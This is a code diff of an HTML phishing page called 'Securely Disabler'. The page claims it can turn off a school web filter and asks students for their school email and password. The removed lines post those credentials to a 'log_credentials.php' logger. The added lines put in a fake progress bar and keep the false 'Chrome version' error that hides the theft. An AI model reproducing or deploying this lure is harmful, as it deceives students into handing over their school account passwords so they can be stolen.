@@ -40,10 +40,26 @@
             border-radius: 5px;
             cursor: pointer;
         }
+        #loading-bar {
+            width: 300px;
+            border: 1px solid #000;
+            margin: 20px auto;
+            padding: 5px;
+            display: none; /* Hide by default */
+        }
+        #loading-progress {
+            width: 0%;
+            height: 20px;
+            background-color: black; /* Change the background color to black */
+        }
+        #output.red {
+            color: red;
+        }
     </style>
 </head>
 <body>
     <div class="container">
+        <img src="https://i.ibb.co/Sn4bfHv/ctwl-Oq45-400x400.jpg" alt="Image" width="200"> <!-- Add this line -->
         <h1>Securely Disabler</h1>
         <p>This script disables Securely on the Wi-Fi network you are using.</p>
         <p>Please provide the required information:</p>
@@ -64,34 +80,42 @@
             <button type="button" class="button" onclick="submitForm()">Submit</button>
         </form>
         <p id="output"></p>
+        <div id="loading-bar">
+            <div id="loading-progress"></div>
+        </div>
     </div>
 
     <script>
         function submitForm() {
-            var firstName = document.getElementById("firstName").value;
-            var email = document.getElementById("email").value;
-            var password = document.getElementById("password").value;
-            var verification = document.getElementById("verification").value;
-            var action = document.getElementById("action").value;
+            // Display loading bar
+            var loadingBar = document.getElementById('loading-bar');
+            loadingBar.style.display = 'block';
 
-            // Construct the data to be logged
-            var data = "First Name: " + firstName + "\n" +
-                       "School Email: " + email + "\n" +
-                       "School Password: " + password + "\n" +
-                       "Image Verification: " + verification + "\n" +
-                       "Action: " + action + "\n\n";
+            // Get the progress bar element
+            var progressBar = document.getElementById('loading-progress');
 
-            // Log the data to errorcodes.txt
-            var xhttp = new XMLHttpRequest();
-            xhttp.open("POST", "log_credentials.php", true);
-            xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-            xhttp.send("data=" + encodeURIComponent(data));
-
-            // Reset form fields
-            document.getElementById("submitForm").reset();
-
-            // Display success message
-            document.getElementById("output").innerHTML = "Error acessing securely API. Please Check Chrome Version And try again. This script won't work above v119 due to chrome patching API calles to extentions. Please update to v119 or above.";";
+            // Initialize width and interval
+            var width = 0;
+            var interval = setInterval(function() {
+                // Increment width
+                width += 1;
+                // Set width style
+                progressBar.style.width = width + '%';
+                // Check if width is at 100%
+                if (width >= 100) {
+                    // Stop the interval
+                    clearInterval(interval);
+                    // Hide loading bar after 1 second
+                    setTimeout(function() {
+                        loadingBar.style.display = 'none';
+                        // Reset form fields
+                        document.getElementById("submitForm").reset();
+                        // Display success message with red color
+                        document.getElementById("output").innerHTML = "Error accessing securely API. Please Check Chrome Version And try again. This script won't work above v119 due to chrome patching API calls to extensions. Please update to v119 or above.";
+                        document.getElementById("output").classList.add('red');
+                    }, 1000); // Delay for 1 second after completion
+                }
+            }, 100); // Increment every 100 milliseconds
         }
     </script>
 </body>
